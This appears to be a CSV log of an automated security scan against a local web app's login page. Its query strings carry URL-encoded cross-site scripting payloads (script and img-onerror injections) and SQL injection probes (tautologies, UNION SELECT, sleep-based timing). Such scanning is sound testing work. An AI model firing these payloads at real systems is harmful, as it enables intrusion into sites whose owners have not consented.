ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
1209,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%3C%2Fdiv%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cdiv%3E,200,OK,7,133,3258
1210,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%3C%2Fdiv%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cdiv%3E,200,OK,12,133,3259
1211,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,11,133,3244
1212,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,7,133,3244
1213,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%3C%2Fdiv%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E%3Cdiv%3E,200,OK,10,133,3254
1214,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E,200,OK,4,133,3231
1215,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,5,133,3244
1216,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%EF%BC%9Cimg+src%3Dx+onerror%3Dprompt%28%29%EF%BC%9E,200,OK,4,133,3229
1217,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,8,133,3244
1218,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,5,133,3244
1219,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,6,133,3244
1220,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,4,133,3244
1221,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,200,OK,4,133,3244
1222,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000,302,Found,8,114,0
1223,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1224,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1225,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=zApPX5sS,200,OK,5,133,3205
1226,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/,302,Found,6,114,0
1227,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1228,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000,302,Found,15,114,0
1229,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000,302,Found,2,114,0
1230,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login,200,OK,11,133,3170
1231,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9%20%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD%20%D0%B8%D0%BB%D0%B8%20%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C,200,OK,10,133,3244
1232,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/sitemap.xml,404,Not Found,6,140,2571
1233,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/robots.txt,404,Not Found,8,140,2571
1234,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000,302,Found,6,114,0
1235,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000,302,Found,7,114,0
1236,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1237,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,2,260,0
1238,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1239,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1240,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%27,200,OK,10,133,3198
1241,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1242,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27,200,OK,8,133,3245
1243,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,8,260,0
1244,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%22,200,OK,8,133,3203
1245,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,19,260,0
1246,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%22,200,OK,6,133,3250
1247,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1248,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%3B,200,OK,6,133,3198
1249,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,12,260,0
1250,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1251,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1252,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1253,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%3B,200,OK,13,133,3245
1254,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1255,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1256,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%27%28,200,OK,10,133,3199
1257,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,14,260,0
1258,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27%28,200,OK,5,133,3246
1259,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,15,260,0
1260,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9%20%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD%20%D0%B8%D0%BB%D0%B8%20%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C,200,OK,13,133,3244
1261,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,8,260,0
1262,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9%20%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD%20%D0%B8%D0%BB%D0%B8%20%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C,200,OK,9,133,3244
1263,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1265,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1264,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+AND+1%3D1+--+,200,OK,7,133,3256
1266,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1267,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+AND+1%3D2+--+,200,OK,8,133,3256
1268,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1269,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1270,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+OR+1%3D1+--+,200,OK,5,133,3255
1271,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+AND+%271%27%3D%271%27+--+,200,OK,11,133,3261
1272,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1273,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+AND+%271%27%3D%272%27+--+,200,OK,9,133,3261
1274,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,13,260,0
1275,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+OR+%271%27%3D%271%27+--+,200,OK,5,133,3260
1276,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+UNION+ALL+select+NULL+--+,200,OK,6,133,3270
1277,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,13,260,0
1278,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+UNION+ALL+select+NULL+--+,200,OK,5,133,3271
1279,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%22+UNION+ALL+select+NULL+--+,200,OK,6,133,3276
1280,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,12,260,0
1282,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%29+UNION+ALL+select+NULL+--+,200,OK,13,133,3271
1281,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1283,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1284,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27%29+UNION+ALL+select+NULL+--+,200,OK,6,133,3272
1285,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,18,260,0
1286,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9%20%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD%20%D0%B8%D0%BB%D0%B8%20%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C,200,OK,12,133,3244
1287,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1288,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,12,260,0
1289,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1290,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,8,260,0
1291,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1292,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1293,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,2,260,0
1294,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1295,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1296,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1297,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1298,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,6,260,0
1299,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,8,260,0
1300,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1301,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,12,260,0
1302,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000,302,Found,7,114,0
1303,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1304,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1305,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1306,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+%2F+sleep%2815%29+,200,OK,12,133,3257
1307,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+%2F+sleep%2815%29+%2F+%27,200,OK,5,133,3261
1308,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1309,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%22+%2F+sleep%2815%29+%2F+%22,200,OK,8,133,3271
1310,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,8,133,3277
1311,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,9,260,0
1312,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,20,133,3278
1313,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,16,260,0
1314,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%22+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,6,133,3283
1315,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,10,260,0
1316,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,13,133,3279
1318,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,4,260,0
1317,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%27+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,2,133,3280
1319,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C%22+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,12,133,3285
1320,Fri Apr 17 17:38:13 EDT 2026,Fri Apr 17 17:38:13 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,11,260,0
1321,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,23,260,0
1322,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,GET,http://0.0.0.0:5000/login?err=%D0%9D%D0%B5%D0%B2%D0%B5%D1%80%D0%BD%D1%8B%D0%B9+%D0%BB%D0%BE%D0%B3%D0%B8%D0%BD+%D0%B8%D0%BB%D0%B8+%D0%BF%D0%B0%D1%80%D0%BE%D0%BB%D1%8C+or+0+in+%28select+sleep%2815%29+%29+--+,200,OK,11,133,3276
1323,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,7,260,0
1324,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,16,260,0
1325,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,14,260,0
1326,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,3,260,0
1327,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,15,260,0
1328,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,5,260,0
1329,Fri Apr 17 17:38:14 EDT 2026,Fri Apr 17 17:38:14 EDT 2026,POST,http://0.0.0.0:5000/login,302,Found,21,260,0
